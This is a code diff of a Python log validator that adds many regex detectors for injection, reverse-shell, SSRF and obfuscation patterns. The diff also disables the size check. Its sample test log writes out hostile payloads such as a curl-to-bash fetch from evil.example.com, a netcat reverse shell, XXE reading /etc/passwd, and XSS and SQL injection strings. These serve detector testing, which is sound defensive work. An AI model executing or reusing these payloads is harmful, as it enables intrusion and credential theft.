-        'ldap_injection': r'[*()\\]',
-        'xml_injection': r'<!(?:DOCTYPE|ENTITY)',
-        'format_string': r'%[sdxn]',
-        'control_chars': r'[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]'
+        # Shell / OS command related
+        'command_injection': r'[;&|`$(){}]',                          # existing: metacharacters
+        'shell_redirect': r'(?:>\s*/|2>\s*/|>\s+[A-Za-z0-9./_-]+)',   # redirecting output to files
+        'shell_pipe': r'\|\s*bash\b',                                # piping to bash
+        'shell_rm_rf': r'\brm\s+-rf\b',                              # destructive commands
+        'shell_wget_curl': r'\b(?:wget|curl)\s+https?:\/\/',         # remote fetch & execute
+        'powershell_exec': r'(?i)powershell\s+-[a-z]+\s',            # powershell invocation
+        'cmd_exec': r'(?i)cmd\.exe|winrm',                           # Windows command patterns
+
+        # Path traversal / filesystem
+        'path_traversal': r'\.\.[/\\]',                              # existing
+        'absolute_unix_path': r'(/etc/passwd|/bin/sh|/usr/bin/)',     # sensitive unix paths
+        'windows_path': r'[A-Za-z]:\\(?:[^\\\/:*?"<>|\r\n]+\\)*',    # drive-letter paths
+
+        # Null / control bytes & encodings
+        'null_byte': r'\x00',                                        # existing
+        'encoded_null': r'%00',                                      # URL-encoded null byte
+        'control_chars': r'[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]',        # existing
+
+        # XSS / script / HTML vectors
+        'script_tag': r'(?i)<\s*script\b[^>]*>.*?<\s*/\s*script\s*>',# existing improved
+        'html_event_handler': r'(?i)on\w+\s*=',                      # onclick=, onerror= etc.
+        'javascript_protocol': r'(?i)javascript:\s*',                # javascript: links
+
+        # SQL injection
+        'sql_injection': r'(?i)(?:\bunion\b|\bselect\b|\binsert\b|\bupdate\b|\bdelete\b|\bdrop\b|\bexec\b|\bexecute\b)\s',
+        'sql_comment': r'(--\s|\b/\*.*?\*/)',                       # SQL comments
+        'sql_tautology': r'(?i)\bOR\b\s+1=1\b',                      # classic tautology
+
+        # NoSQL / Mongo injection
+        'nosql_injection': r'(?i)\{\s*\$where\s*:' ,                # $where operator or other $ operators
+        'nosql_operator': r'(?i)"\s*\$ne\s*":|"\s*\$gt\s*":',        # common operators in payloads
+
+        # LDAP / XML / XPath / XXE
+        'ldap_injection': r'[*()\\]',                               # existing
+        'xml_injection': r'(?i)<\?xml|<!DOCTYPE|\bENTITY\b',        # XXE/doctype directives
+        'xpath_injection': r'(?i)(?:/node\(\)|concat\(|substring\()',
+
+        # Template Injection (Jinja, Twig, etc.)
+        'template_expression': r'(?s)\{\{.*?\}\}|\{%.*?%\}|\$\{.*?\}', # Jinja/Twig/JS templates
+        'template_eval': r'\beval\s*\(',                             # eval usage in templates/scripts
+
+        # Format string / printf
+        'format_string': r'%[sdxuf]',                                # existing-ish
+        'printf_style': r'(?i)printf\s*\(',                          # printf usage
+
+        # CRLF / header injection / email SMTP
+        'crlf_injection': r'(?:%0a|%0d|\r\n)[\w\-]+?:\s',             # encoded/newline header injection
+        'http_header_injection': r'(?i)\r\n\s*[A-Za-z0-9-]+:\s',     # suspicious header line in payload
+
+        # SSRF / local resource access attempts
+        'ssrf_localhost': r'(?i)https?:\/\/(?:127\.0\.0\.1|localhost|0\.0\.0\.0|169\.254\.)', 
+        'ssrf_file_proto': r'(?i)file:\/\/\/',                       # file:// protocol in URLs
+
+        # Remote code execution / eval / exec patterns
+        'rce_eval_exec': r'(?i)\b(eval|exec|system|popen|shell_exec|passthru)\s*\(',
+        'php_code_exec': r'(?i)<\?php\b|phpinfo\s*\(',
+
+        # Command substitution / backticks and $()
+        'command_substitution': r'[`]\s*[^`]+?\s*[`]|\$\([^)]*\)',
+
+        # Encoded & obfuscated payload indicators
+        'base64_blob': r'(?:[A-Za-z0-9+/]{100,}={0,2})',              # large base64 blobs
+        'hex_blob': r'(?:0x[0-9a-fA-F]{40,})',                       # long hex sequences
+
+        # Misc dangerous tokens / patterns
+        'telnet_ftp_attempt': r'(?i)\b(telnet|ftp|tftp|rsh|rexec)\b',
+        'suspicious_exec_patterns': r'(?i)\b(curl|nc|ncat|netcat|python)\s+-c\b',  # run commands via interpreter
+
+        # Common obfuscation patterns: url-encoded, unicode escapes
+        'url_encoded': r'%[0-9a-fA-F]{2,}',                           # many %xx encodings
+        'unicode_escape': r'\\u[0-9a-fA-F]{4}',                      # existing elsewhere
+
+        # Defensive: potential false-positive cleanup guard (tweak as needed)
+        # e.g. allow some SQL words when clearly part of message; tune thresholds elsewhere
     }
     
     # Suspicious patterns
     SUSPICIOUS_PATTERNS = {
+        # Existing ones
         'encoded_data': r'(?:[A-Za-z0-9+/]{40,}={0,2})',  # Base64
-        'hex_encoded': r'(?:0x)?[0-9a-fA-F]{40,}',
-        'unicode_escape': r'\\u[0-9a-fA-F]{4}',
-        'excessive_repetition': r'(.)\1{50,}',
-        'obfuscation': r'(?:[A-Z]{10,}|[a-z]{10,}){3,}'
+        'hex_encoded': r'(?:0x)?[0-9a-fA-F]{40,}',  # Long hex strings
+        'unicode_escape': r'\\u[0-9a-fA-F]{4}',  # Unicode escape sequences
+        'excessive_repetition': r'(.)\1{50,}',  # Repeated characters (compression or DoS)
+        'obfuscation': r'(?:[A-Z]{10,}|[a-z]{10,}){3,}',  # Nonsense text blocks
+
+        # 1️ Suspiciously long continuous alphanumeric strings (possible hashes or encoded tokens)
+        'long_hash_or_token': r'\b[a-fA-F0-9]{32,}\b',
+
+        # 2️ Base85, URL-safe, or custom encoding formats
+        'base85_encoded': r'[A-Za-z0-9!#$%&()*+\-;<=>?@^_`{|}~]{40,}',
+        'url_encoded': r'(?:%[0-9A-Fa-f]{2}){10,}',
+
+        # 3️ Possible data exfiltration attempts via URLs or domains
+        'suspicious_url': r'https?:\/\/[a-zA-Z0-9\-]{20,}\.(com|net|org|ru|cn|xyz)',
+        
+        # 4️ Encoded PowerShell or Bash one-liners
+        'powershell_encoded': r'(?i)powershell\.exe.+-enc\s+[A-Za-z0-9+/=]+',
+        'bash_encoded': r'(?i)echo\s+[A-Za-z0-9+/=]{40,}\s*\|\s*base64',
+
+        # 5️ Hidden or compressed data in logs
+        'gzip_signature': r'(?i)H4sIA[A-Za-z0-9+/=]+',  # gzip base64 pattern
+        'zlib_signature': r'(?i)eJ[A-Za-z0-9+/=]+',  # zlib compressed data
+        'binary_blob': r'(?:[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]{10,})',  # raw binary
+
+        # 6️ Shell command obfuscation
+        'command_substitution': r'\$\([^)]+\)',  # $(...) constructs
+        'escaped_commands': r'\\[abfnrtv\'"\\]',  # Escape sequences
+        'mixed_case_commands': r'(?i)(cMd|PoWeRsHeLl|BaSh)\b',  # Case-mixed commands
+
+        # 7️ Suspicious script tags or encoded JS payloads
+        'encoded_javascript': r'(?i)(eval|unescape|String\.fromCharCode)\s*\(',
+        'data_uri_payload': r'data:[a-zA-Z]+/[a-zA-Z]+;base64,[A-Za-z0-9+/=]+',
+
+        # 8️ Excessive nested braces or parentheses (possible code obfuscation)
+        'nested_braces': r'[{(\[][^})\]]{100,}[})\]]',
+
+        # 9️ Repeated suspicious keywords (common in malware logs)
+        'repeated_keywords': r'(?i)\b(exec|shell|cmd|run|eval|decode)\b.{0,20}\1',
+
+        #  Suspicious Unicode homoglyphs or invisible characters
+        'zero_width_chars': r'[\u200B-\u200D\uFEFF]',  # Zero-width space, joiner
+        'right_to_left_override': r'[\u202E\u202B]',  # RLO/LRO text direction change
+
     }
-    
-    def _init_(
+    # Initializes the log validator with options for PII handling, sanitization, and strict error control.
+    def __init__(
         self,
-        max_log_size: int = MAX_LOG_SIZE,
+        #max_log_size: int = MAX_LOG_SIZE,
         allow_pii: bool = False,
         sanitize_pii: bool = True,
-        strict_mode: bool = True
+        strict_mode: bool = False
     ):
         """
         Initialize log validator
@@ -960,11 +345,11 @@ class LogValidator:
             sanitize_pii: Sanitize detected PII
             strict_mode: Fail on any critical issue
         """
-        self.max_log_size = max_log_size
+       # self.max_log_size = max_log_size
         self.allow_pii = allow_pii
         self.sanitize_pii = sanitize_pii
         self.strict_mode = strict_mode
-    
+    # Runs all validation checks on a log (format, security, PII, injections, etc.) and returns the overall result.
     def validate(self, log_text: str, metadata: Optional[Dict] = None) -> ValidationResult:
         """
         Validate log text
@@ -996,8 +381,8 @@ class LogValidator:
             )
         
         # Size validation
-        size_issues = self._validate_size(log_text)
-        issues.extend(size_issues)
+       # size_issues = self._validate_size(log_text)
+       # issues.extend(size_issues)
         
         # Format validation
         format_issues = self._validate_format(log_text)
@@ -1018,6 +403,10 @@ class LogValidator:
         # Suspicious pattern detection
         suspicious_issues = self._detect_suspicious_patterns(log_text)
         issues.extend(suspicious_issues)
+
+        # Banned text detection
+        banned_issues = self._detect_banned_text(log_text)
+        issues.extend(banned_issues)
         
         # Determine validity
         critical_issues = [i for i in issues if i.severity in [SeverityLevel.CRITICAL, SeverityLevel.HIGH]]
@@ -1041,7 +430,7 @@ class LogValidator:
             metadata=result_metadata,
             sanitized_log=sanitized_log if self.sanitize_pii else None
         )
-    
+    '''''
     def _validate_size(self, log_text: str) -> List[ValidationIssue]:
         """Validate log size constraints"""
         issues = []
@@ -1078,8 +467,8 @@ class LogValidator:
                 ))
                 break
         
-        return issues
-    
+        return issues '''
+    # Checks the log’s structure for format issues like null bytes or invalid UTF-8 characters.
     def _validate_format(self, log_text: str) -> List[ValidationIssue]:
         """Validate log format and structure"""
         issues = []
@@ -1114,7 +503,7 @@ class LogValidator:
             ))
         
         return issues
-    
+    # Scans the log for hidden or unsafe control characters that could pose security or parsing risks
     def _validate_security(self, log_text: str) -> List[ValidationIssue]:
         """Validate security aspects"""
         issues = []
@@ -1153,6 +542,7 @@ class LogValidator:
         
         return issues, sanitized_log if self.sanitize_pii else None
     
+    # Detects possible injection attacks (like SQL, command, or script injections) in the log text.
     def _detect_injections(self, log_text: str) -> List[ValidationIssue]:
         """Detect injection attempts"""
         issues = []
@@ -1168,6 +558,22 @@ class LogValidator:
         
         return issues
     
+    def _detect_banned_text(self, log_text: str) -> List[ValidationIssue]:
+      """Detect banned text or hardcoded secrets"""
+      issues = []
+
+      for banned_type, pattern in self.BANNED_TEXT_PATTERNS .items():
+           matches = re.findall(pattern, log_text)
+           if matches:
+               issues.append(ValidationIssue(
+                severity=SeverityLevel.HIGH,
+                category="banned_text_detection",
+                message=f"Detected {len(matches)} instance(s) of {banned_type.replace('_', ' ')}",
+                recommendation="Remove banned or sensitive text before processing"
+                ))
+
+      return issues
+
     def _detect_suspicious_patterns(self, log_text: str) -> List[ValidationIssue]:
         """Detect suspicious patterns"""
         issues = []
@@ -1186,6 +592,8 @@ class LogValidator:
 
 
 # Utility functions
+
+#These functions validate logs — either a single log file or a batch of logs using the LogValidator class and return detailed validation results for each
 def validate_log_file(file_path: str, validator: Optional[LogValidator] = None) -> ValidationResult:
     """Validate log from file"""
     if validator is None:
@@ -1216,7 +624,7 @@ def validate_log_file(file_path: str, validator: Optional[LogValidator] = None) 
             metadata={"source": file_path, "error": str(e)}
         )
 
-
+# Validates multiple logs at once using the LogValidator class.
 def validate_log_batch(logs: List[str], validator: Optional[LogValidator] = None) -> List[ValidationResult]:
     """Validate multiple logs"""
     if validator is None:
@@ -1226,22 +634,102 @@ def validate_log_batch(logs: List[str], validator: Optional[LogValidator] = None
 
 
 # Example usage
-if _name_ == "_main_":
+if __name__ == "__main__":
+
     # Initialize validator
     validator = LogValidator(
-        max_log_size=5 * 1024 * 1024,  # 5MB
+        #max_log_size=5 * 1024 * 1024,  # 5MB
         allow_pii=False,
         sanitize_pii=True,
         strict_mode=True
     )
     
     # Example log with issues
-    test_log = """
-    2025-11-05 14:30:00 ERROR Test failed
-    User email: john.doe@example.com
-    API Key: sk_live_1234567890abcdefghijklmnop
-    Connection failed to 192.168.1.100
+   # test_log = """
+    #2025-11-05 14:30:00 ERROR Test failed
+    #User email: john.doe@example.com
+    #API Key: sk_live_1234567890abcdefghijklmnop
+    #Connection failed to 192.168.1.100
+    #""" 
+    #Example testing banned words
+    
+    
+#     test_log = '''
+#    2025-11-05 19:20:00 DEBUG print('Debugging mode enabled')
+#     INFO Using testuser credentials for API access
+#     WARNING Found password = "SuperSecret123!"
+#     ALERT api_key = "abcd1234apikeyexample"
+#     NOTICE Secret_Key = "do_not_log_this"
+#     INFO Internal URL: https://staging.internal.example.com/api
+#     ERROR Connection using ssh key -----BEGIN RSA PRIVATE KEY-----
+#     CONFIG dotenv file loaded from /app/.env
+#     '''
+
+    #Example testing 
+
+    test_log = r"""
+        2025-11-06 10:00:00 INFO Normal startup message
+
+    # Shell / OS command tries
+    2025-11-06 10:00:01 WARN Received user input: `rm -rf /tmp/test`  # backticks -> command substitution
+    2025-11-06 10:00:02 WARN Piped command: echo "run" | bash
+    2025-11-06 10:00:03 WARN Exec attempt: $(curl http://evil.example.com/payload | bash)
+    2025-11-06 10:00:04 WARN Powershell call: powershell -NoProfile -Command "Invoke-WebRequest 'http://x'"
+
+    # Path traversal & sensitive file access
+    2025-11-06 10:00:05 ERROR Open failed: ../../etc/passwd
+    2025-11-06 10:00:06 ERROR Windows path seen: C:\Windows\System32\drivers\etc\hosts
+
+    # Null / encoded bytes & control chars
+    2025-11-06 10:00:07 INFO Received payload with null: %00 (url-encoded) and raw \x00
+    2025-11-06 10:00:08 INFO Control chars: \x07\x08\x0B (bell/backspace/vertical tab)
+
+    # XSS / HTML / JS vectors
+    2025-11-06 10:00:09 ALERT <script>alert('xss')</script>
+    2025-11-06 10:00:10 ALERT Anchor using javascript: javascript:alert(1)
+    2025-11-06 10:00:11 WARN HTML event: <img src=x onerror=alert(1)>
+
+    # SQL injection patterns
+    2025-11-06 10:00:12 ERROR Query param: ' OR 1=1 -- 
+    2025-11-06 10:00:13 ERROR Suspicious SQL: SELECT * FROM users WHERE username='admin' OR 1=1;
+
+    # NoSQL / Mongo-like payload
+    2025-11-06 10:00:14 WARN Payload: {"$where": "this.password.match(/.*/)"}
+    2025-11-06 10:00:15 WARN Operator injection: {"username": {"$ne": null}}
+
+    # LDAP / XML / XXE / XPath
+    2025-11-06 10:00:16 ERROR Received XML: <?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+    2025-11-06 10:00:17 WARN XPath snippet: /bookstore/book[author='admin' or 1=1]
+
+    # Template injection & eval-like constructs
+    2025-11-06 10:00:18 DEBUG Template: {{ config.ADMIN_PASSWORD }}
+    2025-11-06 10:00:19 DEBUG Jinja eval attempt: {% set a = cycler(1) %}{{ a.next() }}
+    2025-11-06 10:00:20 WARN Eval call: eval("malicious()")
+
+    # Format strings / printf style
+    2025-11-06 10:00:21 INFO Format payload: Got %s bytes from user input
+
+    # CRLF / HTTP header injection / SSRF / file protocol
+    2025-11-06 10:00:22 WARN Header injection: GET / HTTP/1.1\r\nHost: innocent\r\nX-Injected: injected
+    2025-11-06 10:00:23 WARN SSRF attempt: http://127.0.0.1:8000/admin
+    2025-11-06 10:00:24 WARN File protocol: file:///etc/shadow
+
+    # Remote exec / common attack utilities
+    2025-11-06 10:00:25 ERROR Shell exec pattern: python -c "import os; os.system('id')"
+    2025-11-06 10:00:26 ERROR Tools: nc -e /bin/sh 192.168.0.1 4444
+
+    # Encoded / obfuscated blobs (base64 / hex)
+    2025-11-06 10:00:27 INFO Large base64: AAAA... (base64 blob example) AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==
+    2025-11-06 10:00:28 INFO Hex blob: 0xabcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890
+
+    # Misc suspicious tokens & service attempts
+    2025-11-06 10:00:29 WARN Telnet attempt: telnet 10.0.0.1
+    2025-11-06 10:00:30 WARN FTP attempt: ftp://evil.example.com/shell
+
+    # Template-like JS interpolation and command substitution
+    2025-11-06 10:00:31 DEBUG JS template: ${process.env.PASSWORD}
     """
+
     
     # Validate
     result = validator.validate(test_log)
